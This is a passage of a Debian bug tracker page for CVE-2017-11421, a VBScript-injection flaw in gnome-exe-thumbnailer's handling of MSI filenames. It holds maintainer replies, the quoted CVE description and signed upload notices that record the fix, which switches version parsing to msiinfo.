<hr><p class="msgreceived"><a name="36"></a><a name="msg36"></a><a href="#36">Message #36</a> received at 868705@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=36">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=36">mbox</a>, <a href="mailto:868705@bugs.debian.org?subject=Re%3A%20%5Bpkg-wine-party%5D%20Bug%23868705%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%0A%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript&amp;References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E%0A%09%3C20170718185317.bzervuwoahorskfk%40eldamar.local%3E%0A%20%3C20170718212617.35b96a97%40heffalump.sk2.org%3E&amp;body=On%20Tue%2C%2018%20Jul%202017%2021%3A26%3A17%20%2B0200%20Stephen%20Kitt%20%3Cskitt%40debian.org%3E%20wrote%3A%0A%3E%20Hi%20Salvatore%2C%0A%3E%20%0A%3E%20On%20Tue%2C%2018%20Jul%202017%2020%3A53%3A17%20%2B0200%2C%20Salvatore%20Bonaccorso%20%3Ccarnil%40debian.org%3E%0A%3E%20wrote%3A%0A%3E%20%3E%20CVE-2017-11421%20has%20been%20assigned%20for%20this%20issue.%0A%3E%20%0A%3E%20Thanks%2C%20I%E2%80%99ve%20added%20that%20to%20the%20changelog%20and%20uploaded%20the%20package.%0A%3E%20%0A%3E%20Regards%2C%0A%3E%20%0A%3E%20Stephen%0A&amp;In-Reply-To=%3C20170718212617.35b96a97%40heffalump.sk2.org%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=skitt%40debian.org" alt="">
<div class="header"><span class="headerfield">From:</span> Stephen Kitt &lt;skitt@debian.org&gt;</div>
<div class="header"><span class="headerfield">To:</span> Salvatore Bonaccorso &lt;carnil@debian.org&gt;</div>
<div class="header"><span class="headerfield">Cc:</span> 868705@bugs.debian.org, Nils Dagsson Moskopp
 &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;</div>
<div class="header"><span class="headerfield">Subject:</span> Re: [pkg-wine-party] Bug#868705: gnome-exe-thumbnailer: Thumbnail
 generation for MSI files executes arbitrary VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 21:26:17 +0200</div>
</div>
<pre class="mime">[<a href="bugreport.cgi?att=0;bug=868705;msg=36">Message part 1</a> (text/plain, inline)]</pre>
<pre class="message">Hi Salvatore,

On Tue, 18 Jul 2017 20:53:17 +0200, Salvatore Bonaccorso &lt;carnil@debian.org&gt;
wrote:
&gt; <a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a> has been assigned for this issue.

Thanks, Ive added that to the changelog and uploaded the package.

Regards,

Stephen
</pre>
<pre class="mime">[<a href="bugreport.cgi?att=1;bug=868705;msg=36">Message part 2</a> (application/pgp-signature, inline)]</pre>

<div class="infmessage"><hr><p>
<a name="37"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt; -->
<!-- time:1500407103 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>:<br>
<code>Bug#868705</code>; Package <code>gnome-exe-thumbnailer</code>.
 (Tue, 18 Jul 2017 19:45:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=38">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=38">mbox</a>, <a href="#37">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="39"></a>
<!-- request_addr: Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt; -->
<!-- time:1500407103 -->
<strong>Acknowledgement sent</strong>
to <code>Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;</code>.
 (Tue, 18 Jul 2017 19:45:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=40">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=40">mbox</a>, <a href="#39">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="41"></a><a name="msg41"></a><a href="#41">Message #41</a> received at 868705@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=41">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=41">mbox</a>, <a href="mailto:868705@bugs.debian.org?In-Reply-To=%3C87lgnlv8a7.fsf%40lustschutzbunker.localdomain%3E&amp;body=On%20Tue%2C%2018%20Jul%202017%2021%3A45%3A20%20%2B0200%20Nils%20Dagsson%20Moskopp%20%3Cnils%40dieweltistgarnichtso.net%3E%20wrote%3A%0A%3E%20Quote%20%3Chttp%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2017-11421%3E%3A%0A%3E%20%0A%3E%20%3E%20gnome-exe-thumbnailer%20before%200.9.5%20is%20prone%20to%20a%20VBScript%20Injection%0A%3E%20%3E%20when%20generating%20thumbnails%20for%20MSI%20files%2C%20aka%20the%20%22Bad%20Taste%22%0A%3E%20%3E%20issue.%20There%20is%20a%20local%20attack%20if%20the%20victim%20uses%20the%20GNOME%20Files%20file%0A%3E%20%3E%20manager%2C%20and%20navigates%20to%20a%20directory%20containing%20a%20.msi%20file%20with%0A%3E%20%3E%20VBScript%20code%20in%20its%20filename.%0A%3E%20%0A%3E%20Note%20that%20thumbnailer%20issues%20could%20be%20exploited%20via%20drive-by%20downloads%0A%3E%20with%20any%20web%20browser%20that%20does%20not%20ask%20users%20if%20files%20should%20be%20saved.%0A%3E%20%0A%3E%20Salvatore%20Bonaccorso%20%3Ccarnil%40debian.org%3E%20writes%3A%0A%3E%20%0A%3E%20%3E%20Control%3A%20retitle%20-1%20gnome-exe-thumbnailer%3A%20CVE-2017-11421%3A%20Thumbnail%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript%0A%3E%20%3E%20%20%0A%3E%20%3E%20Hi%0A%3E%20%3E%0A%3E%20%3E%20CVE-2017-11421%20has%20been%20assigned%20for%20this%20issue.%0A%3E%20%3E%0A%3E%20%3E%20Regards%2C%0A%3E%20%3E%20Salvatore%0A%3E%20%0A%3E%20--%20%0A%3E%20Nils%20Dagsson%20Moskopp%20%2F%2F%20erlehmann%0A%3E%20%3Chttp%3A%2F%2Fdieweltistgarnichtso.net%3E%0A&amp;References=%3C150032530207.9507.14135120544829383621.reportbug%40lustschutzbunker.localdomain%3E%20%3C20170718185317.bzervuwoahorskfk%40eldamar.local%3E%0A%20%3C87lgnlv8a7.fsf%40lustschutzbunker.localdomain%3E&amp;subject=Re%3A%20Bug%23868705%3A%20gnome-exe-thumbnailer%3A%20Thumbnail%20generation%20for%20MSI%20files%20executes%20arbitrary%20VBScript">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=nils%40dieweltistgarnichtso.net" alt="">
<div class="header"><span class="headerfield">From:</span> Nils Dagsson Moskopp &lt;nils@dieweltistgarnichtso.net&gt;</div>
<div class="header"><span class="headerfield">To:</span> Salvatore Bonaccorso &lt;carnil@debian.org&gt;, Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;, 868705@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#868705: gnome-exe-thumbnailer: Thumbnail generation for MSI files executes arbitrary VBScript</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 21:45:20 +0200</div>
</div>
<pre class="mime">[<a href="bugreport.cgi?att=0;bug=868705;msg=41">Message part 1</a> (text/plain, inline)]</pre>
<pre class="message">Quote &lt;<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11421">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11421</a>&gt;:

&gt; gnome-exe-thumbnailer before 0.9.5 is prone to a VBScript Injection
&gt; when generating thumbnails for MSI files, aka the &quot;Bad Taste&quot;
&gt; issue. There is a local attack if the victim uses the GNOME Files file
&gt; manager, and navigates to a directory containing a .msi file with
&gt; VBScript code in its filename.

Note that thumbnailer issues could be exploited via drive-by downloads
with any web browser that does not ask users if files should be saved.

Salvatore Bonaccorso &lt;carnil@debian.org&gt; writes:

&gt; Control: retitle -1 gnome-exe-thumbnailer: <a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a>: Thumbnail generation for MSI files executes arbitrary VBScript
&gt;  
&gt; Hi
&gt;
&gt; <a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a> has been assigned for this issue.
&gt;
&gt; Regards,
&gt; Salvatore

-- 
Nils Dagsson Moskopp // erlehmann
&lt;<a href="http://dieweltistgarnichtso.net">http://dieweltistgarnichtso.net</a>&gt;
</pre>
<pre class="mime">[<a href="bugreport.cgi?att=1;bug=868705;filename=signature.asc;msg=41">signature.asc</a> (application/pgp-signature, inline)]</pre>

<div class="msgreceived"><hr><p>
<a name="42"></a>
<!-- request_addr: James Lu &lt;bitflip3@gmail.com&gt; -->
<!-- time:1500407643 -->
<strong>Reply sent</strong>
to <code>James Lu &lt;bitflip3@gmail.com&gt;</code>:<br>
You have taken responsibility.
 (Tue, 18 Jul 2017 19:54:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=43">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=43">mbox</a>, <a href="#42">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="44"></a>
<!-- request_addr: Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt; -->
<!-- time:1500407643 -->
<strong>Notification sent</strong>
to <code>Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;</code>:<br>
Bug acknowledged by developer.
 (Tue, 18 Jul 2017 19:54:03 GMT) (<a href="bugreport.cgi?bug=868705;msg=45">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=45">mbox</a>, <a href="#44">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="46"></a><a name="msg46"></a><a href="#46">Message #46</a> received at 868705-close@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=46">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=46">mbox</a>, <a href="mailto:868705@bugs.debian.org?In-Reply-To=%3CE1dXYWO-0000W4-LY%40fasolo.debian.org%3E&amp;subject=Re%3A%20Bug%23868705%3A%20fixed%20in%20gnome-exe-thumbnailer%200.9.5-1&amp;References=%3CE1dXYWO-0000W4-LY%40fasolo.debian.org%3E&amp;body=On%20Tue%2C%2018%20Jul%202017%2019%3A51%3A04%20%2B0000%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20wrote%3A%0A%3E%20Source%3A%20gnome-exe-thumbnailer%0A%3E%20Source-Version%3A%200.9.5-1%0A%3E%20%0A%3E%20We%20believe%20that%20the%20bug%20you%20reported%20is%20fixed%20in%20the%20latest%20version%20of%0A%3E%20gnome-exe-thumbnailer%2C%20which%20is%20due%20to%20be%20installed%20in%20the%20Debian%20FTP%20archive.%0A%3E%20%0A%3E%20A%20summary%20of%20the%20changes%20between%20this%20version%20and%20the%20previous%20one%20is%0A%3E%20attached.%0A%3E%20%0A%3E%20Thank%20you%20for%20reporting%20the%20bug%2C%20which%20will%20now%20be%20closed.%20%20If%20you%0A%3E%20have%20further%20comments%20please%20address%20them%20to%20868705%40bugs.debian.org%2C%0A%3E%20and%20the%20maintainer%20will%20reopen%20the%20bug%20report%20if%20appropriate.%0A%3E%20%0A%3E%20Debian%20distribution%20maintenance%20software%0A%3E%20pp.%0A%3E%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20%28supplier%20of%20updated%20gnome-exe-thumbnailer%20package%29%0A%3E%20%0A%3E%20%28This%20message%20was%20generated%20automatically%20at%20their%20request%3B%20if%20you%0A%3E%20believe%20that%20there%20is%20a%20problem%20with%20it%20please%20contact%20the%20archive%0A%3E%20administrators%20by%20mailing%20ftpmaster%40ftp-master.debian.org%29%0A%3E%20%0A%3E%20%0A%3E%20-----BEGIN%20PGP%20SIGNED%20MESSAGE-----%0A%3E%20Hash%3A%20SHA512%0A%3E%20%0A%3E%20Format%3A%201.8%0A%3E%20Date%3A%20Tue%2C%2018%20Jul%202017%2008%3A18%3A48%20%2B0800%0A%3E%20Source%3A%20gnome-exe-thumbnailer%0A%3E%20Binary%3A%20gnome-exe-thumbnailer%0A%3E%20Architecture%3A%20source%0A%3E%20Version%3A%200.9.5-1%0A%3E%20Distribution%3A%20unstable%0A%3E%20Urgency%3A%20high%0A%3E%20Maintainer%3A%20Debian%20Wine%20Party%20%3Cpkg-wine-party%40lists.alioth.debian.org%3E%0A%3E%20Changed-By%3A%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%0A%3E%20Description%3A%0A%3E%20%20gnome-exe-thumbnailer%20-%20Wine%20.exe%20and%20other%20executable%20thumbnailer%20for%20GNOME%0A%3E%20Closes%3A%20868705%0A%3E%20Changes%3A%0A%3E%20%20gnome-exe-thumbnailer%20%280.9.5-1%29%20unstable%3B%20urgency%3Dhigh%0A%3E%20%20.%0A%3E%20%20%20%20%5B%20Stephen%20Kitt%20%5D%0A%3E%20%20%20%20%2A%20Fix%20the%20filename%20mangling%20in%20debian%2Fwatch.%0A%3E%20%20.%0A%3E%20%20%20%20%5B%20James%20Lu%20%5D%0A%3E%20%20%20%20%2A%20New%20upstream%20release.%0A%3E%20%20%20%20%20%20-%20Switch%20to%20msitools%27%20msiinfo%20for%20ProductVersion%20fetching%2C%20replacing%20the%0A%3E%20%20%20%20%20%20%20%20insecure%20VBScript-based%20parsing%20as%20described%20at%0A%3E%20%20%20%20%20%20%20%20http%3A%2F%2Fnews.dieweltistgarnichtso.net%2Fposts%2Fgnome-thumbnailer-msi-fail.html%0A%3E%20%20%20%20%20%20%20%20%28Closes%3A%20%23868705%3B%20LP%3A%20%23651610%3B%20CVE-2017-11421%29.%0A%3E%20%20%20%20%2A%20Add%20Enhances%3A%20caja%2C%20tumbler%20%28%3E%3D%200.1.92~%29%2C%20nautilus%2C%20nemo%0A%3E%20%20%20%20%20%20These%20are%20some%20of%20the%20many%20file%20managers%2Fthumbnailer%20programs%20that%20support%0A%3E%20%20%20%20%20%20desktop%20thumbnailers%20like%20exe-thumbnailer%2C%20and%20I%20have%20verified%20%28at%20some%0A%3E%20%20%20%20%20%20point%29%20that%20all%20of%20these%20work.%0A%3E%20%20%20%20%2A%20fallback-thumbnail-limit.patch%3A%20drop%2C%20applied%20upstream.%0A%3E%20%20%20%20%2A%20Bump%20Standards-Version%20to%204.0.0%3B%20no%20changes%20needed.%0A%3E%20%20%20%20%2A%20Add%20msitools%20to%20recommends%3B%20it%20is%20used%20to%20fetch%20.msi%20version%20info.%0A%3E%20Checksums-Sha1%3A%0A%3E%20%204355e1bc808c0390ffc6c049cc0cdd2069ff8835%202071%20gnome-exe-thumbnailer_0.9.5-1.dsc%0A%3E%20%201d72428b14402601d5f7d9962dbf7d1edea14bdc%2055246%20gnome-exe-thumbnailer_0.9.5.orig.tar.gz%0A">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=bitflip3%40gmail.com" alt="">
<div class="header"><span class="headerfield">From:</span> James Lu &lt;bitflip3@gmail.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> 868705-close@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Bug#868705: fixed in gnome-exe-thumbnailer 0.9.5-1</div>
<div class="header"><span class="headerfield">Date:</span> Tue, 18 Jul 2017 19:51:04 +0000</div>
</div>
<pre class="message">Source: gnome-exe-thumbnailer
Source-Version: 0.9.5-1

We believe that the bug you reported is fixed in the latest version of
gnome-exe-thumbnailer, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 868705@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
James Lu &lt;bitflip3@gmail.com&gt; (supplier of updated gnome-exe-thumbnailer package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)


-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Tue, 18 Jul 2017 08:18:48 +0800
Source: gnome-exe-thumbnailer
Binary: gnome-exe-thumbnailer
Architecture: source
Version: 0.9.5-1
Distribution: unstable
Urgency: high
Maintainer: Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;
Changed-By: James Lu &lt;bitflip3@gmail.com&gt;
Description:
 gnome-exe-thumbnailer - Wine .exe and other executable thumbnailer for GNOME
Closes: <a href="bugreport.cgi?bug=868705">868705</a>
Changes:
 gnome-exe-thumbnailer (0.9.5-1) unstable; urgency=high
 .
   [ Stephen Kitt ]
   * Fix the filename mangling in debian/watch.
 .
   [ James Lu ]
   * New upstream release.
     - Switch to msitools&#39; msiinfo for ProductVersion fetching, replacing the
       insecure VBScript-based parsing as described at
       <a href="http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html">http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html</a>
       (Closes: #868705; LP: #651610; <a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a>).
   * Add Enhances: caja, tumbler (&gt;= 0.1.92~), nautilus, nemo
     These are some of the many file managers/thumbnailer programs that support
     desktop thumbnailers like exe-thumbnailer, and I have verified (at some
     point) that all of these work.
   * fallback-thumbnail-limit.patch: drop, applied upstream.
   * Bump Standards-Version to 4.0.0; no changes needed.
   * Add msitools to recommends; it is used to fetch .msi version info.
Checksums-Sha1:
 4355e1bc808c0390ffc6c049cc0cdd2069ff8835 2071 gnome-exe-thumbnailer_0.9.5-1.dsc
 1d72428b14402601d5f7d9962dbf7d1edea14bdc 55246 gnome-exe-thumbnailer_0.9.5.orig.tar.gz
 0e507cf2dd41121397e1290bcb3d4fda131e75a3 4688 gnome-exe-thumbnailer_0.9.5-1.debian.tar.xz
 bfd6dc806c210373af8be2599a7cf1d14bb459af 5914 gnome-exe-thumbnailer_0.9.5-1_source.buildinfo
Checksums-Sha256:
 2159443d583e73503d4183af1f48352ce6c7d360040872486d5c2aff4c7f7e28 2071 gnome-exe-thumbnailer_0.9.5-1.dsc
 1b59acf7005bf42aca85a71b08a771dc5b74ce44dca1ef34972a876fb4212e2d 55246 gnome-exe-thumbnailer_0.9.5.orig.tar.gz
 eb6d38aa59fde580dddee3b48b81c6e9ed2b51f053c80d75c4e7db5efc1c3159 4688 gnome-exe-thumbnailer_0.9.5-1.debian.tar.xz
 643cf586ef581596206e50e61fb4daeafae71987e816ca8fae13f69d43f64d4c 5914 gnome-exe-thumbnailer_0.9.5-1_source.buildinfo
Files:
 caea506e039c66cbbdc1546978015b58 2071 gnome optional gnome-exe-thumbnailer_0.9.5-1.dsc
 c933062c81fb1d55c7037271db99785a 55246 gnome optional gnome-exe-thumbnailer_0.9.5.orig.tar.gz
 9edd8dfdd80b14dcbcc81afde71ea318 4688 gnome optional gnome-exe-thumbnailer_0.9.5-1.debian.tar.xz
 d09a9f110dd043d5d7169261ef626daf 5914 gnome optional gnome-exe-thumbnailer_0.9.5-1_source.buildinfo

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEnPVX/hPLkMoq7x0ggNMC9Yhtg5wFAlluYI0ACgkQgNMC9Yht
g5wBLQ//RWSk7pTwl9SizslpFxQ6nE8VE6JB+eww8HRnoezgXvqK76qAvfc6/17t
iwc+mdmj9gMyEyV8BA2YCzatvkKYLmfNZDFmBEd7pEHPIdB9gIakSpxvdlzW2Z4S
XxyzrAIRP/upOagNg0inZqXeEFSe/SI3389ogvi+NaSffkZ/8B8UHINZ7UKRUc6n
zOvuCocP95O8HLxfEYGG1G7eU+SsNAUtIB9PJD4brUzq0AW2nglxfkxurCdZxBjI
O5GFnq8xvgbbMS/jqHo9DJulDj74p3N3W8+Jiy0px+CelsUJ8dTrF14FZM6gMcjt
Tcyax41Otpu9le+rRAz67qobvGZXZdpnmpAYNed9U078KHy3edYOhNxkW9nKAJ9X
VC6rNbq9QwKvjroJnol3PBJ/EOzLYsIGD0aPnYtLdrHthO4GTfPiE0xvyGwR9KZ/
5ALWEeCowSk77Lx01z4fq34euquNVMhTb6iaNyReIpCVDSmZYL2RBJFbKQP9Ar1v
vk2Nc4j6VhWOtJWXJh+mwdDAKuNM+Ud0gG1fUspcRpU0So61TUAx6EvAYVho5DLF
0r6ufBWd6dni+SOHpwTdlZxUUc0HtIs6x2OGVODiTHNxk3YeNlIzeyLine9iu6dg
2MaQXkUPsqUmJV6JXm1hYr3VEpvseRo/PDm4WdGWlpf6qTFw7bg=
=iYvD
-----END PGP SIGNATURE-----



</pre>

<div class="msgreceived"><hr><p>
<a name="47"></a>
<!-- request_addr: James Lu &lt;bitflip3@gmail.com&gt; -->
<!-- time:1502554896 -->
<strong>Reply sent</strong>
to <code>James Lu &lt;bitflip3@gmail.com&gt;</code>:<br>
You have taken responsibility.
 (Sat, 12 Aug 2017 16:21:36 GMT) (<a href="bugreport.cgi?bug=868705;msg=48">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=48">mbox</a>, <a href="#47">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="49"></a>
<!-- request_addr: Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt; -->
<!-- time:1502554896 -->
<strong>Notification sent</strong>
to <code>Nils Dagsson Moskopp &lt;nils+debian-reportbug@dieweltistgarnichtso.net&gt;</code>:<br>
Bug acknowledged by developer.
 (Sat, 12 Aug 2017 16:21:36 GMT) (<a href="bugreport.cgi?bug=868705;msg=50">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=50">mbox</a>, <a href="#49">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="51"></a><a name="msg51"></a><a href="#51">Message #51</a> received at 868705-close@bugs.debian.org (<a href="bugreport.cgi?bug=868705;msg=51">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=51">mbox</a>, <a href="mailto:868705@bugs.debian.org?In-Reply-To=%3CE1dgZ65-0008ID-30%40fasolo.debian.org%3E&amp;References=%3CE1dgZ65-0008ID-30%40fasolo.debian.org%3E&amp;subject=Re%3A%20Bug%23868705%3A%20fixed%20in%20gnome-exe-thumbnailer%200.9.4-2%2Bdeb9u1&amp;body=On%20Sat%2C%2012%20Aug%202017%2016%3A17%3A09%20%2B0000%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20wrote%3A%0A%3E%20Source%3A%20gnome-exe-thumbnailer%0A%3E%20Source-Version%3A%200.9.4-2%2Bdeb9u1%0A%3E%20%0A%3E%20We%20believe%20that%20the%20bug%20you%20reported%20is%20fixed%20in%20the%20latest%20version%20of%0A%3E%20gnome-exe-thumbnailer%2C%20which%20is%20due%20to%20be%20installed%20in%20the%20Debian%20FTP%20archive.%0A%3E%20%0A%3E%20A%20summary%20of%20the%20changes%20between%20this%20version%20and%20the%20previous%20one%20is%0A%3E%20attached.%0A%3E%20%0A%3E%20Thank%20you%20for%20reporting%20the%20bug%2C%20which%20will%20now%20be%20closed.%20%20If%20you%0A%3E%20have%20further%20comments%20please%20address%20them%20to%20868705%40bugs.debian.org%2C%0A%3E%20and%20the%20maintainer%20will%20reopen%20the%20bug%20report%20if%20appropriate.%0A%3E%20%0A%3E%20Debian%20distribution%20maintenance%20software%0A%3E%20pp.%0A%3E%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%20%28supplier%20of%20updated%20gnome-exe-thumbnailer%20package%29%0A%3E%20%0A%3E%20%28This%20message%20was%20generated%20automatically%20at%20their%20request%3B%20if%20you%0A%3E%20believe%20that%20there%20is%20a%20problem%20with%20it%20please%20contact%20the%20archive%0A%3E%20administrators%20by%20mailing%20ftpmaster%40ftp-master.debian.org%29%0A%3E%20%0A%3E%20%0A%3E%20-----BEGIN%20PGP%20SIGNED%20MESSAGE-----%0A%3E%20Hash%3A%20SHA512%0A%3E%20%0A%3E%20Format%3A%201.8%0A%3E%20Date%3A%20Tue%2C%2025%20Jul%202017%2007%3A28%3A41%20-0700%0A%3E%20Source%3A%20gnome-exe-thumbnailer%0A%3E%20Binary%3A%20gnome-exe-thumbnailer%0A%3E%20Architecture%3A%20source%0A%3E%20Version%3A%200.9.4-2%2Bdeb9u1%0A%3E%20Distribution%3A%20stretch%0A%3E%20Urgency%3A%20high%0A%3E%20Maintainer%3A%20Debian%20Wine%20Party%20%3Cpkg-wine-party%40lists.alioth.debian.org%3E%0A%3E%20Changed-By%3A%20James%20Lu%20%3Cbitflip3%40gmail.com%3E%0A%3E%20Description%3A%0A%3E%20%20gnome-exe-thumbnailer%20-%20Wine%20.exe%20and%20other%20executable%20thumbnailer%20for%20GNOME%0A%3E%20Closes%3A%20868705%0A%3E%20Changes%3A%0A%3E%20%20gnome-exe-thumbnailer%20%280.9.4-2%2Bdeb9u1%29%20stretch%3B%20urgency%3Dhigh%0A%3E%20%20.%0A%3E%20%20%20%20%2A%20Add%20patch%20switch-to-msiinfo.patch%3A%0A%3E%20%20%20%20%20%20-%20Switch%20to%20msitools%27%20msiinfo%20for%20ProductVersion%20fetching%2C%20replacing%20the%0A%3E%20%20%20%20%20%20%20%20insecure%20VBScript-based%20parsing%20as%20described%20at%0A%3E%20%20%20%20%20%20%20%20http%3A%2F%2Fnews.dieweltistgarnichtso.net%2Fposts%2Fgnome-thumbnailer-msi-fail.html%0A%3E%20%20%20%20%20%20%20%20%28Closes%3A%20%23868705%3B%20LP%3A%20%23651610%3B%20CVE-2017-11421%29%0A%3E%20%20%20%20%2A%20Add%20msitools%20to%20recommends%3B%20it%20is%20now%20used%20to%20fetch%20.msi%20version%20info.%0A%3E%20%20%20%20%2A%20Add%20patch%20fix-version-label-readability.patch%20backported%20from%0A%3E%20%20%20%20%20%20https%3A%2F%2Fgithub.com%2Fgnome-exe-thumbnailer%2Fgnome-exe-thumbnailer%2Fcommit%2F1cf4df81836985d9660f950287232b3255ee17bb%0A%3E%20%20%20%20%20%20to%20fix%20unreadable%20white-on-white%20text%20on%20version%20labels.%0A%3E%20Checksums-Sha1%3A%0A%3E%20%205e7a07883b56197e25bdd3a23e2b66740ff2d508%202099%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1.dsc%0A%3E%20%20ce5e525d1a614d999c02f220c99d3ee68e9a5111%206096%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1.debian.tar.xz%0A%3E%20%2057deb3a84ec4ce9486ec8bc24190d412e309c089%206008%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1_source.buildinfo%0A%3E%20Checksums-Sha256%3A%0A%3E%20%205999ec0cb78928404927cbe660ee26a6a9cb3b3d0d2b7d89bf2b48bd22385dc7%202099%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1.dsc%0A%3E%20%20c40e8c596aefd2ef1ffdf6eb08d938fae12b2edc46455cf46fba520bf237e9a6%206096%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1.debian.tar.xz%0A%3E%20%20297872ee4722ad8e3cecfa21d9e54ed7fc43183854228e6634491792e0b40db1%206008%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1_source.buildinfo%0A%3E%20Files%3A%0A%3E%20%201ca70c81c6a39c13ccfcf8370b98baaf%202099%20gnome%20optional%20gnome-exe-thumbnailer_0.9.4-2%2Bdeb9u1.dsc%0A">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=bitflip3%40gmail.com" alt="">
<div class="header"><span class="headerfield">From:</span> James Lu &lt;bitflip3@gmail.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> 868705-close@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Bug#868705: fixed in gnome-exe-thumbnailer 0.9.4-2+deb9u1</div>
<div class="header"><span class="headerfield">Date:</span> Sat, 12 Aug 2017 16:17:09 +0000</div>
</div>
<pre class="message">Source: gnome-exe-thumbnailer
Source-Version: 0.9.4-2+deb9u1

We believe that the bug you reported is fixed in the latest version of
gnome-exe-thumbnailer, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 868705@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
James Lu &lt;bitflip3@gmail.com&gt; (supplier of updated gnome-exe-thumbnailer package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)


-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Tue, 25 Jul 2017 07:28:41 -0700
Source: gnome-exe-thumbnailer
Binary: gnome-exe-thumbnailer
Architecture: source
Version: 0.9.4-2+deb9u1
Distribution: stretch
Urgency: high
Maintainer: Debian Wine Party &lt;pkg-wine-party@lists.alioth.debian.org&gt;
Changed-By: James Lu &lt;bitflip3@gmail.com&gt;
Description:
 gnome-exe-thumbnailer - Wine .exe and other executable thumbnailer for GNOME
Closes: <a href="bugreport.cgi?bug=868705">868705</a>
Changes:
 gnome-exe-thumbnailer (0.9.4-2+deb9u1) stretch; urgency=high
 .
   * Add patch switch-to-msiinfo.patch:
     - Switch to msitools&#39; msiinfo for ProductVersion fetching, replacing the
       insecure VBScript-based parsing as described at
